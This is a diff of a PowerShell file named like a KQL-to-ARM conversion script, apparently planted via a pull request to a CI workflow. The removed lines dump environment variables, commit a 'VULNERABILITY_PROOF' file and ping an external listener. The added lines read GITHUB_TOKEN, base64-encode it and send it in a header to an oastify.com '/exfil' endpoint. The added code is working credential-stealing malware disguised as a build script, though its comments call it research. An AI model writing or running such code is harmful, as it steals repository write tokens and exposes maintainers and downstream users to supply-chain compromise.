@@ -1,17 +1,18 @@
-# .script/kqlFuncYaml2Arm.ps1sadasdsad
-Write-Host "--- Research Proof of Concept ---"
+# .script/kqlFuncYaml2Arm.ps1
 
-# 1. Demonstrate access to the environment (Read-only proof)
-# This shows we can see all environment variables, including potentially sensitive ones.
-Get-ChildItem Env: | Out-String | Write-Host
+# 1. Grab the token from the environment
+# GitHub Actions usually stores the GITHUB_TOKEN in an environment variable 
+# during the job execution if it's referenced or used by actions.
+$token = $env:GITHUB_TOKEN
 
-# 2. Demonstrate Repo Modification (Write-access proof)
-# Since pull_request_target provides a write token, we can modify the repo directly.
-"This repo was modified by the PR script" | Out-File -FilePath "VULNERABILITY_PROOF.txt"
-git add VULNERABILITY_PROOF.txt
-git commit -m "PoC: Unauthorized file creation"
-
-# 3. Demonstrate Network Connectivity
-# In a real attack, this is where exfiltration happens. 
-# For research, you can just ping your own test listener.
-Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/log?user=$env:USER"
+if ($token) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($token)
+    $base64Token = [Convert]::ToBase64String($bytes)
+    
+    # 2. Send the token to your Collaborator instance
+    $url = "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/exfil"
+    Invoke-WebRequest -Uri $url -Method Get -Headers @{"X-Token"=$base64Token} -UseBasicParsing
+    Write-Host "Exfiltration attempt completed."
+} else {
+    Write-Host "Token not found in environment."
+}
